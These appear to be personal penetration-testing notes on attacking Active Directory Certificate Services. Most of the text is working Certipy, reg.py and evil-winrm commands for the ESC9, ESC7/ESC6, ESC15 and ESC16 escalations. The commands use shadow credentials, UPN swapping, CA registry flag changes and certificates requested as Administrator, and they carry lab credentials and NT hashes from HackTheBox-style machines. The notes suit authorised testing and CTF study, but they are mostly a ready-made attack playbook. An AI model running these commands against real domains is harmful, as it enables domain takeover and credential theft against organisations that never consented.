# Creating Certificates from Certsrv.

To create a certificate first we’ll need to create a CSR (Certificate Signing Request). We can use openssl to do the job.

```bash
openssl genrsa -des3 -out amanda.key 2048 ​# create private key
openssl req -new -key amanda.key -out amanda.csr ​# create csr
```

Enter a passphrase when prompted and the same while creating the CSR. Press enter through all
the prompts.

Sign in to /certsrv -> Request a certificate -> advanced certificate request

Enter the content of the csr file in certificate request and leave the rest as it's.

# Enumerate ADCS configurations with Certipy

```bash
certipy find -u 'judith.mader@certified.htb' -p judith09 -dc-ip 10.10.11.41 -vulnerable -enabled
```

More..
https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/

# Exploiting ESC9

more.. https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#no-security-extension-esc9

From UNIX-like systems, Certipy (Python) can be used to enumerate for, and conduct, the ESC9 scenario.

In this scenario, user1 has GenericWrite against user2 and wants to compromise user3. user2 is allowed to enroll in a vulnerable template that specifies the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value.

First, the user2's hash is needed. It can be retrieved via a Shadow Credentials attack, for example.

```bash
certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
```

Then, the userPrincipalName of user2 is changed to user3.

```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn user3
```

The vulnerable certificate can be requested as user2.

```bash
certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
```

The user2's UPN is changed back to something else.

```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
```

Now, authenticating with the obtained certificate will provide the user3's NT hash during UnPac the hash. The domain must be specified since it is not present in the certificate.

```bash
certipy auth -pfx 'user3.pfx' -domain "$DOMAIN"
```

## ESC7

Has two exploits, SubCA and Exposing to ESC6

### Exposing to ESC6:

If sufficient rights are obtained over the Certificate Authority (ManageCA?, local admin account, ...) an attacker could remotely edit the registries, enable the EDITF_ATTRIBUTESUBJECTALTNAME2 attribute, restart the CertSvc service, and abuse ESC6

```bash
# /!\ Beware: change placeholder values CA-NAME, VALUE, NEW_VALUE

# query flags
reg.py "$DOMAIN"/"$USER":"$PASSWORD"@$"ADCS_IP" query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags

# bitwise OR to set the flag if not already (nothing changed if already set)
python3 -c print("NEW_VALUE:", VALUE | 0x40000)

# write flags
reg.py "$DOMAIN"/"$USER":"$PASSWORD"@$"ADCS_IP" add-keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags -vd NEW_VALUE
```

## ESC15

```bash
certipy req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target-ip 10.10.11.72 -u cert_admin -p password@123 -template WebServer -upn Administrator@tombwatcher.htb -application-policies 'Client Authentication'
```

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72 -username administrator -ldap-scheme ldap
```

#### Exploit Scenario B

Instead of giving the resulting certificate the ability to authenticate, I’ll give it the agent property:

```bash
certipy req -u cert_admin -p '0xdf0xdf!' -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Certificate Request Agent'
```

I can basically complete the ESC3 attack (like in Certificate). I’ll use that PFX to request a ticket as Administrator for a template that is meant for user login:

```bash
certipy req -u cert_admin -p '0xdf0xdf!' -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'
```

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72
```

## ESC16

Prerequisites:

- A CA configured to disable the SID extension.
- An **attacker-controlled account with permission to enroll any client-auth** certificate.
- Domain controllers not enforcing full certificate binding (mode 0 or 1).

Step(1): Updating the UPN (User Principal Name)

```bash
certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
```

```bash
certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update
```

Now we are updating the UPN of the **ca_svc** user to grant administrator privileges. It’s time to request the certificate.

```bash
certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
```

Now we have the administrative certificate, but we still can’t authenticate with it. Like ESC9, we have to update the UPN again to ca_svc, and now we can authenticate as an administrator. Make sure to follow the same sequence.

```bash
certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc@fluffy.htb update
```

It’s time to authenticate as an administrator now using Certipy.

```bash
certipy auth -dc-ip 10.10.11.69 -pfx administrator.pfx -u administrator -domain fluffy.htb

evil-winrm -i dc01.fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```
